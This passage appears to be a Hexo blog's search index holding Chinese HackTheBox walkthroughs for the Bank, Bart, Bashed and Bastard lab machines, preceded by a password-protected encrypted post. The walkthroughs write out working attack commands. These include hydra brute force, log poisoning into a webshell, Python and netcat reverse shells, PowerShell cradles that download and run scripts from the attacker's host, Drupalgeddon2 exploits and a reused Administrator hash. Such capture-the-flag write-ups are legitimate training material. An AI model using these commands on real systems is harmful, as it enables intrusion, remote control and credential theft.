5a1462dd8c2675759699d8f56d0bb5dfbcc56cbd3fe304e46876343f503f360b97e7c6d03dadac523ace57afd08bb5fe971ace0a90f9f34b851cedeb41d05ff168248cb131b756eb926c5bac58863931b29c45b193a32117c390c163642ce5a63a0a219681810fc8965cd2624b262b089542417b1db13b1a9aa52aa725ecf4687b82a1de241e328ebd14c146aa52ecaa22c6ba5caa42ca1a0fd590ed30168a75fcb023ebed7abc194c7c06f72f1a614814c5e113253aa7bd7dc31d6ccdbdf063a4efe9179c3fb553687078e0732faf7b521dfbb69d9e1e33d6008512258084aeca642cef72ea9045ef8801f4580de13d90e60d699dcc884559fb96290042179a3ec44424d1f25dd17a09602642ccacd9b966345373442b5bd2cdda8396317a399a69add70abf1da9b7f8a82d57843653331abd8c9f2ded99fbb457d6ac5876d328339ac01c219a5dbbce5a52297bbd93696f9b5dff213739a0a3654cf38006ed81537b2ce05e5d2c5751ff9743829adefae0aa264b761d0b9cc9638a70ee376ea3ed7861dbba434d62209a8841bb5dfb78717f86348fa5f985342c8b046756f707dfa7e3766d20a234c123aece3f428c2d8a2cd750f4977b7c067ed5c6c5566fdcb181657a40f12e33236b3e8e471c0bfa7f57b28ca78145edaf218af330b1365d45627f761a35f2e3103c412e14de80e934a8b8a701bc27f0fdb0495b17267edb229e4ba470dc772cc1b155a2067d8b10dabea176f44f81f1ca10dbee7d4e2531b5d9d1128fbef73e250b141e17fb1cbbf893abe5e66323cb6104b47bfb16c7d993618fec5b7626117d1538d35efda73c94d99e6ba124fabe5b499f897bd7641f742ff284f7b71a3c1c7797e83c5f674ad37db7c00a31f0a8febfb98b4bd67b8d502d09b4e755b6831e968e9f006e87622e603d2530dc47943a1310c1f100d510055562807aa957cc21470fc17d1729446166a72f0776d86df4ba3ef35b4d8bc5eea05fc9c486e7627a303bf4d1be4cbfdc39a409a2d18e3d45afc4911052baed4c2fbaeea1d4acd72a98aa49ab4f4e06d02f50bfb59729d3c34e29828e043528e802c38a16b3e5d768bb52d888552ad7023641bb4abfd13efa2e91d7112554d56c6d77df72873e9c8213c0878e54daaab7f751b752864f082fd904c4a007468c89a74093339d109c4407ceaf95d248f7ce7fbc228e62261b328995a8918c2aec1661efca0e058bb74f36be65efa5cd979c3a4ee36dc68af81d61f826012d65002ea2bf699eda949e69e0dfcb5292cde8354fc82cb334878659da2234f3e309fa387fb82c661c600d87ba4a30c3926a17db362234cff63ec4a39e3f9df5322fe33d5b1adb40ce3e4ae4037c114296445527516cd45577ac197790624b02858a47f56a7db33696d3783836a230d0f9b9a03401cbafbb6ba274bc70eafb8c4a2aca95b4b3d989224a0b239373ac9b021f2eca3fd87f11387edeedaf96d4320eb7b393b511b306af9ba34f020a5af102aa2a8db589f51099fb7c5885e47dc06196a767598f11db6d9b20c93f5fb92768b1d6d3727a3f9a5a425086e875a0e7e8cd5c49eaea02eac06a761ea7039fff87a1b38ff291cefeae9a6b4ab8e1eeba0129759168e5b375cdfa3356531d7f44e4bdee39acd9f056b6bedb95845dcfa5b3a883be92d251aa82c90596b0b9fa00a267e4700304e7594b37f8cdc882ed473ef97fa291e5dd4ee48b62f56633ac03585095a86bd8682f97a6005ec3f8a72632532fb955f607a0edfb86e2315091b6040b14be77ce4054b5cfdc146484f8b3f9f57c67881809e195ce9563968b349bd959901e74de951fd9c4e684f0df30a26287ae24d7fa9bdfa7798b8f4a9a01bc25b87c2b6b1926b74265ef21010986079ed93695ada7325fbbc64450fe03593ef5401777fdfa33c192b885de6545c2a72eba68699fcb895d06f9d173ee851628fd994ff26535fd62b7a57ce78ebaa2746e9b5082d8221f3a3559b3f2aed257445bbc78a80b2283e08b2865f5b82eda7abc26536486fe9f4be0ab05575adb913eba7477491e4e8e19dd39ae1decee7bdd7a3211ff3863a4ff742082163c53ecb0a4210e24825599f63580addca2b68573672cd3b6741b7b31a605fe1f27601152c751507893ea1f659d2958733ee080d37b983d04d40d2b3eaa857dfa594ea10693df49429edf081c75a425ab323eddee2d752db429cfbd555d1a5ed40cdce3397c52a3ea2e3a7d0497a2e2fbda1de5e604e5f525c8e8bdaabacaa203fe6253b690efbdba602f872f72b237f33623ee1acd8a9fe189c6f3f34b6f6d7fc291841affdbd79d95726cfa79c6978a402058eda4d41b95a41e959a003f61c3d62a63d778e65b9d3c5ade653f87d365688402b5dfb713541a9e21b15fe188d2a467520f10834672211914e81a102a351663717f2415528aaaa71db3d42b1c800bfb8fd33b130a752664d368a746a62be698c44b0ed2e3c1c96a8107216d7fffd638d1625929f756c26c31bb85cc4e6365aa62a9ea1e7745b174f29482a36c8a5adb717efe5d0c975eb5922e5f36fd6273be3a84c424c46403004579eb4ed3476e8d6b0dd62410b9314afea8ac02b631204d4497280101f1a8e552c8ffa773ca39faa9493ba8877c930773df4595591677d8f1f796abc60e7e154cfe37a1ae42741df8bb2eeba8a64efe8288a8f933b64c102116efeacee1b644fb974f53814be68de0f2a43621508d60e3eea8ebe9ce4a3189fad7e69e57c895a2e3628ac05953f47442d453b4d36cb2cd938def3b56807ca327db3f064cdd5ee1c9e53da0e126073e0751e67cae012ba2773cae25b2cea87e02bad7d63c8bb964eb1201742bbafcec50b0ccba1cbf5c11cc7692788cd3bc708edd2766c56ab6d0a077efac51d470b684e5465749ba0630e5806b5ec9fcd03c56f47af4743c91470732b1abbf1b2653ce34ca783fe6d80962e84d09cbdd46de590f5bd0925030da6b49649026d2c84c577b221d5cdc4d0f7f5a01b388f4d475629e2e9673e190390d2907ce12ef14f966090608a83d0f5c838ac8944f7c2810780d4e509f4643ca2916a8f4dc55bbc74034360b02df773edb83a741fabb1e6e02014f02d546cb1702a1518c8ca9ced6d227289561cf75cbef31e67b61d3ab9b2fa9eddaa15c6074eebeda5e61ddd767d5aeb941fd82c47cfd2d0c49c174119ef2b4aa135d1df03b8b21fafa03add2c68601287bdc17fad10b46dfd1ba0d99a899a51d0a5f3d4c65410ab2242b3977a73be7ac36c760d967507e9e91b10bc025fb778bf18580b7c05111361348d4929b29220799e77bca2ba762a86f3503789e515408bea3c551a2dd21ad72fe1ed5cf86fab23dc216288c445370c350db7ff845654dfe97024415f962210e746e6c6739b17b463f122ac08040c970ae7f4e0ea30ea7e94d81dfdf59087d30dbc9d26d03a4d85609a63d9d320cc5de3bad6a469576a7769e99c28dc398d5f914e65494cc417f7ca9dace72c8f7a903994ea77e00d31e467264e21b6ced18b222ad2ba1c8d65c02993f1f7d266985682dacbea45a7b33403f1ca254a38413e4d416fb5deefa5616bc1266b9fc564ce179e12ffb13adcb94d6b992fb68dce38e454ad4f5c4a0d22810344c51b666f9340299891bb3115edcca1c0d81aaf9d22f8f98297bf3b64bc24d583e62aa357991694caaf4d44ab42978ee7df2f028fc01348d5cb81da0d1737597557714be5031e98af4861f8eb55452562669bcdd22d0cf88be87aaa866c1a3146834a7f7236009b07ada5f69b68dbe8d2b5014e6a1cbd286db6bca301e86a12b7f33c9c2cb09147188b4f89b148d8665bb5a2c88aa21bf6cefcccd1bab9aaca6a9550bd011c60dfaf05b09c2902dfa2a5bae721a9c0ca49ffba31b831561db6cede8ea8bb8bc7faac565ac7d8e6b05a2ab40c2846a5419c69e2f245198ffaab9d1cd0553127acab25035ece267d262a7f9d0eab7a804a61abff6624a3052f02a123f4782d9790ad3993abc627e33aa93b78622d03ca9ec0b9fd40f20fde417d0d139d9202114df43bb39b7bb923a407b8ce361d2ae2727a5885459808f22a70d5402cfe83382f4f573bed0dad1a4a50b10deb3071e898e03f2495960900555e4907a9ee40d4e4e501b6140e5dd740e564413f77bbc94bd329e5e4bd27da57a3f97a4a9bdd78b2701a9cf8acaa7e665a9ba12841b7ee37f500cdda7c7c2861791d9a7108ea8065c36c2ea516acb17872e3e023fa0223a1431e5ee2ea40cf967b7463e026a46c39112c98da44e2a79284c644732cf0bbf6e9a878576f6d4725f3356e9abdf886ff49fc7b124518d7db8aaab359119f78f18bdd90d3d8c213704a53cd1e12959170a763e279b9e95b1168ca2f82d2f1c86741b709663bc387d4f13ab37f32e1304d24c95a76116802836197dbfc12a5ca68dd90a3dadd561984b07c2b2e2a2f94b48563321b1f7aee44134a2a3f05032692ab5fe2899cc47987a79bcf33c96a3e95940f27f79dc93a75d50419c11ada5e6</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">root hash</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bank</title>
    <url>/2020/10/19/HTB-Bank/</url>
    <content><![CDATA[<h1 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bank/1.png" alt="1"></p>
<p>发现了常规服务SSH、DNS、Apache HTTP</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><h4 id="DNS枚举"><a href="#DNS枚举" class="headerlink" title="DNS枚举"></a>DNS枚举</h4><p>鉴于发现了DNS服务，我们可以尝试DNS枚举，如DNS区域传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.29 bank.htb axfr</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bank/2.png" alt="2"></p>
<p>利用成功，发现了一些记录，可以把这些添加到hosts里，或者直接修改<code>/etc/resolv.conf</code>，添加对方DNS解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nameserver 10.10.10.29</span><br></pre></td></tr></table></figure>

<p>这样也可以访问所有域名</p>
<p>现在尝试访问http服务</p>
<p>www是默认页面</p>
<p><img src="/images/Bank/3.png" alt="3"></p>
<p>bank.htb为登录页</p>
<p><img src="/images/Bank/4.png" alt="4"></p>
<p>尝试登录页sql注入，失败，进行http目录枚举</p>
<p><img src="/images/Bank/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>尝试访问<code>.php</code>页面，发现都跳转到了login.php</p>
<p>在<code>balance-transfer</code>下发现了一些有意思的文件</p>
<p><img src="/images/Bank/6.png" alt="6"></p>
<p>许多文件，打开其中一个</p>
<p><img src="/images/Bank/7.png" alt="7"></p>
<p>开头显示加密成功，看来可能是一个可以仔细寻找的东西</p>
<p>使用wget的-r参数进行递归下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r http:&#x2F;&#x2F;bank.htb&#x2F;balance-transfer&#x2F;</span><br></pre></td></tr></table></figure>

<p>之后进行过滤<br>可以根据文件大小过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l|grep -v 584|grep -v 585|grep -v 582|grep -v 583|grep -v 581|grep -v 253503</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bank/8.png" alt="8"></p>
<p>或者根据文件字符数逆排序</p>
<p><img src="/images/Bank/9.png" alt="9"></p>
<p>都会发现一个奇特的文件，而里面存有凭据</p>
<p><img src="/images/Bank/10.png" alt="10"></p>
<p>可以用来登录，之后有文件上传点</p>
<p><img src="/images/Bank/11.png" alt="11"></p>
<p>尝试上传，并进行文件名、content-type、magic-bytes之类的绕过，但是不行<br>再次查看页面，发现提示<code>.htb</code>文件名会被php解析</p>
<p><img src="/images/Bank/12.png" alt="12"></p>
<p>进行修改</p>
<p><img src="/images/Bank/13.png" alt="13"></p>
<p>看来上传成功，上传位置直接显示在页面中</p>
<p><img src="/images/Bank/14.png" alt="14"></p>
<p>获取shell</p>
<p><img src="/images/Bank/15.png" alt="15"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>学习自IppSec</p>
<p>之前访问<code>bank.htb/support.php</code>会返回302，如果细心，burp打开服务器响应拦截，会发现</p>
<p><img src="/images/Bank/16.png" alt="16"></p>
<p>虽然返回了302，但是还返回了一个html页面，修改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 OK</span><br></pre></td></tr></table></figure>

<p>这里修改完HTTP报头就不需要再删除<code>Location</code>字段了</p>
<p><img src="/images/Bank/17.png" alt="17"></p>
<p>可以得到同样的结果，之后为了方便，开启burp的匹配</p>
<p><img src="/images/Bank/18.png" alt="18"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>非常明显</p>
<p>可以修改/etc/passwd</p>
<p><img src="/images/Bank/19.png" alt="19"></p>
<p>或者发现SUID文件</p>
<p><img src="/images/Bank/20.png" alt="20"></p>
<p>执行即可</p>
<p><img src="/images/Bank/21.png" alt="21"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bart</title>
    <url>/2020/07/01/HTB-Bart/</url>
    <content><![CDATA[<h1 id="Bart"><a href="#Bart" class="headerlink" title="Bart"></a>Bart</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bart/1.jpg" alt="1"></p>
<p>只有80端口</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>访问主页</p>
<p><img src="/images/Bart/2.jpg" alt="2"></p>
<p>发现302跳转forum.bart.htb，也许应该添加到host里，先不急</p>
<p>进行目录枚举</p>
<p><img src="/images/Bart/4.jpg" alt="4"></p>
<p>发现了枚举的目录都会返回200，200页面如下所示</p>
<p><img src="/images/Bart/3.jpg" alt="3"></p>
<p>不过，还是发现了一个存在的页面</p>
<p><img src="/images/Bart/5.jpg" alt="5"></p>
<p>而且发现该站点是wordpress</p>
<p><img src="/images/Bart/6.jpg" alt="6"></p>
<p>添加host</p>
<p><img src="/images/Bart/7.jpg" alt="7"></p>
<p>再次访问</p>
<p><img src="/images/Bart/8.jpg" alt="8"></p>
<p>得到了与之前相同的配置</p>
<p>访问wp默认登录页面</p>
<p><img src="/images/Bart/9.jpg" alt="9"></p>
<p>发现页面不存在，这个站点被修改过了<br>现在卡住了，尝试gobuster扫描，过滤显示HTTP状态码，换一个更大的字典</p>
<p><img src="/images/Bart/10.jpg" alt="10"></p>
<p>现在我们发现了另一个目录</p>
<p><img src="/images/Bart/11.jpg" alt="11"></p>
<p>访问后是一个登录页面<br>有一个忘记密码</p>
<p><img src="/images/Bart/12.jpg" alt="12"></p>
<p>通过它可以暴力枚举用户名，而且该页面的csrftoken不会变</p>
<p>一同操作发现账户秒 <code>harvey/potter</code></p>
<p><img src="/images/Bart/13.jpg" alt="13"></p>
<p>在之前页面的源代码里也能找到提示</p>
<p><img src="/images/Bart/14.jpg" alt="14"></p>
<p>登录后又提示了一个host，修改后再次登录</p>
<p><img src="/images/Bart/15.jpg" alt="15"></p>
<p>登录后又提示了一个host</p>
<p><img src="/images/Bart/16.jpg" alt="16"></p>
<p>访问后又是一个登录框，这次也没有csrf token</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l harvey -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt internal-01.bart.htb http-form-post &quot;&#x2F;simple_chat&#x2F;login.php:uname&#x3D;^USER^&amp;passwd&#x3D;^PASS^&amp;submit&#x3D;Login:Invalid Username or Password&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bart/17.jpg" alt="17"></p>
<p>发现了神奇的现象，很多密码显示正确<br>随便输一个显示正确的密码过去</p>
<p><img src="/images/Bart/18.jpg" alt="18"></p>
<p>发现原来密码有长度限制</p>
<p>我们可以忽略两者共同的错误回显关键词Password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l harvey -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt internal-01.bart.htb http-form-post &quot;&#x2F;simple_chat&#x2F;login.php:uname&#x3D;^USER^&amp;passwd&#x3D;^PASS^&amp;submit&#x3D;Login:Password&quot;</span><br></pre></td></tr></table></figure>

<p>不过这需要很长的时间，我们可以把低于8位的给删掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -nr &#39;&#x2F;^.&#123;8,150&#125;$&#x2F;p&#39; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt &gt; pass.txt</span><br></pre></td></tr></table></figure>

<p>不过仍然会遇到这样的问题</p>
<p><img src="/images/Bart/20.jpg" alt="20"></p>
<p>问题在302请求的host变成了10.10.10.81，之后又会跳转到之前任意访问200状态码的页面<br>所以应该在burp配置端口转发(本地80转发10.10.10.81的80)<br>接着添加host匹配</p>
<p><img src="/images/Bart/21.jpg" alt="21"></p>
<p>成功获取密码</p>
<p><img src="/images/Bart/22.jpg" alt="22"></p>
<p>登陆后是一个聊天室<br>查看源码，可以发现一个url</p>
<p><img src="/images/Bart/23.jpg" alt="23"></p>
<p>页面只显示1，不过再次访问1.txt，发现上面输出了http请求的UA，看来是一个日志<br><img src="/images/Bart/24.jpg" alt="24"></p>
<p>我们尝试控制UA输入一段php代码，之后再去包含，发现代码会被执行</p>
<p><img src="/images/Bart/25.jpg" alt="25"></p>
<p>所以写入webshell</p>
<p><img src="/images/Bart/26.jpg" alt="26"></p>
<p><img src="/images/Bart/27.jpg" alt="27"></p>
<p>url编码反弹powershell命令</p>
<p><img src="/images/Bart/28.jpg" alt="28"></p>
<p><img src="/images/Bart/29.jpg" alt="29"></p>
<p>这个日志毒化很有意思，好像我们包含哪个文件 ，哪个文件就会被写入UA，如果不存在就会创建它<br>所以我们第一次访问不会有反馈，再访问一次就会看到上一次的UA信息</p>
<p>成功毒化日志getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>powershell成功，不过我们会遇到一个问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Environment]::Is64BitOperatingSystem</span><br><span class="line">True</span><br><span class="line">[Environment]::Is64BitProcess</span><br><span class="line">False</span><br></pre></td></tr></table></figure>

<p>我们在64位的系统上运行着32位，这会导致一些问题的发生<br>我们可以指定默认路径下的64位powershell反弹链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\windows\sysnative\Windowspowershell\v1.0\powershell.exe iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bart/31.jpg" alt="31"></p>
<p>成功解决了这个问题<br>但powerup还是不能运行</p>
<p>最后还是用nc链接，解决了这个问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;iex(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;PowerUp.ps1&#39;); Invoke-AllChecks&quot;</span><br></pre></td></tr></table></figure>

<p>具体为什么会这样感觉很迷，浪费了很多时间</p>
<p><img src="/images/Bart/32.jpg" alt="32"></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -c &quot;$user&#x3D; &#39;WORKGROUP\Administrator&#39; ; $pass&#x3D;&#39;3130438f31186fbaf962f407711faddb&#39;; try &#123; Invoke-Command -ScriptBlock &#123; iex(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp2.ps1&#39;) &#125; -ComputerName BART -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) &#125; catch &#123; echo $_.Exception.Message &#125;&quot; 2&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>本地发现445</p>
<p><img src="/images/Bart/33.jpg" alt="33"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbserver.py a &#x2F;root&#x2F;Desktop</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd %temp%</span><br><span class="line">copy \\10.10.16.98\a\plink64.exe</span><br><span class="line">cmd &#x2F;c &quot;echo y|C:\Windows\Temp\plink64.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.16.98&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bart/34.jpg" alt="34"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U Administrator &#x2F;&#x2F;127.0.0.1 &quot;cmd.exe&quot;</span><br><span class="line">3130438f31186fbaf962f407711faddb</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bashed</title>
    <url>/2020/06/09/HTB-Bashed/</url>
    <content><![CDATA[<h1 id="Bashed"><a href="#Bashed" class="headerlink" title="Bashed"></a>Bashed</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bashed/2.jpg" alt="2"></p>
<p>只有80端口在开放</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Bashed/3.jpg" alt="3"></p>
<p>web服务貌似是一个靶场</p>
<p><img src="/images/Bashed/1.jpg" alt="1"></p>
<p>就这我进行了目录探测</p>
<p>之后在<code>/dev</code>里发现了webshell</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>执行反向shell连接</p>
<p><img src="/images/Bashed/4.jpg" alt="4"></p>
<p>上面方法都不行，python倒是可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.132&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bashed/5.jpg" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用提权脚本</p>
<p><img src="/images/Bashed/6.jpg" alt="6"></p>
<p>发现可以使用脏牛</p>
<p><img src="/images/Bashed/7.jpg" alt="7"></p>
<p>不过机器上没有gcc</p>
<p>之后我尝试在机器上收集一些信息，发现可以切换到用户scriptmanager，且不需要密码，执行bash -i直接获取交互shell</p>
<p><img src="/images/Bashed/8.jpg" alt="8"></p>
<p>之后在这个账户下，找到了一些拥有w权限的文件</p>
<p><img src="/images/Bashed/9.jpg" alt="9"></p>
<p>我对test.py进行了观察</p>
<p><img src="/images/Bashed/11.jpg" alt="11"></p>
<p>我发现这似乎是一个计划任务，接着我使用<code>pspy</code>对进程进行扫描</p>
<p><img src="/images/Bashed/10.jpg" alt="10"></p>
<p>发现执行者是root，而且我拥有对<code>/scripts</code>文件夹的修改权限，可以添加一个反弹shell由root执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.132&#39;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; &gt; test.py</span><br></pre></td></tr></table></figure>

<p>反弹payload与之前低权限的一样，这样等待一会儿</p>
<p><img src="/images/Bashed/12.jpg" alt="12"></p>
<p>就能获取root权限了</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Bastard</title>
    <url>/2020/06/10/HTB-Bastard/</url>
    <content><![CDATA[<h1 id="Bastard"><a href="#Bastard" class="headerlink" title="Bastard"></a>Bastard</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bastard/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口在运行drupal</p>
<p>首先可以看看drupal的版本，通过changelog.txt</p>
<p><img src="/images/Bastard/2.jpg" alt="2"></p>
<p>发现版本为7.54，可以运行droopescan进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">droopescan scan drupal -u http:&#x2F;&#x2F;10.10.10.9&#x2F; -t 32</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/3.jpg" alt="3"></p>
<p>不过这个扫描很慢，我的网络还丢包就算了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞</p>
<p><img src="/images/Bastard/4.jpg" alt="4"></p>
<p>7.54可能能用的exp也就这个7.x了</p>
<p><img src="/images/Bastard/5.jpg" alt="5"></p>
<p>这是攻击原理，我们需要修改exp</p>
<p>安装php-curl(根据php -v)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install php7.3-curl</span><br></pre></td></tr></table></figure>

<p>对方url地址、一句话木马</p>
<p><img src="/images/Bastard/6.jpg" alt="6"></p>
<p>执行还是不行，检查后发现路径变了</p>
<p><img src="/images/Bastard/7.jpg" alt="7"></p>
<p><img src="/images/Bastard/8.jpg" alt="8"></p>
<p>还需要修改下exp的路径，(通过目录扫描可以获取)</p>
<p><img src="/images/Bastard/9.jpg" alt="9"></p>
<p>再次执行exp，这次成功了</p>
<p><img src="/images/Bastard/10.jpg" alt="10"></p>
<p>现在可以尝试RCE漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.9&#x2F;&#x2F;dixuSOspsOUU.php?cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/11.jpg" alt="11"></p>
<p>webshell命令执行成功</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p><img src="/images/Bastard/14.jpg" alt="14"></p>
<p>添加窃取的cookie，可以直接以admin登录</p>
<p><img src="/images/Bastard/15.jpg" alt="15"></p>
<p>之后点击Module→打开PHP filter→save configuration</p>
<p>之后点击</p>
<p><img src="/images/Bastard/16.jpg" alt="16"></p>
<p><img src="/images/Bastard/17.jpg" alt="17"></p>
<p><img src="/images/Bastard/18.jpg" alt="18"></p>
<p>点解下方preview</p>
<p><img src="/images/Bastard/19.jpg" alt="19"></p>
<p>代码执行成功</p>
<h3 id="NC获取shell"><a href="#NC获取shell" class="headerlink" title="NC获取shell"></a>NC获取shell</h3><p>本机开启smb</p>
<p>执行payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.9&#x2F;&#x2F;dixuSOspsOUU.php?cmd&#x3D;copy%20\\10.10.16.132\a\nc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/12.jpg" alt="12"></p>
<p>再执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.9&#x2F;&#x2F;dixuSOspsOUU.php?cmd&#x3D;nc%2010.10.16.132%205555%20%20-e%20cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/13.jpg" alt="13"></p>
<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><p><a href="https://github.com/dreadlocked/Drupalgeddon2">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby drupalgeddon2.rb http:&#x2F;&#x2F;10.10.10.9</span><br></pre></td></tr></table></figure>

<p>期间报错缺少highline</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gem install highline</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/20.jpg" alt="20"></p>
<p>执行exp</p>
<p><img src="/images/Bastard/21.jpg" alt="21"></p>
<p>中间输入系统命令，输入加载我们反弹powershell的文件即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.123&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p>这样就能获取powershell</p>
<h3 id="cve-2018-7600"><a href="#cve-2018-7600" class="headerlink" title="cve-2018-7600"></a>cve-2018-7600</h3><p><a href="https://github.com/pimps/CVE-2018-7600">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install bs4</span><br><span class="line">python drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;10.10.10.9&#x2F; -c &quot;command&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Bastard/22.jpg" alt="22"></p>
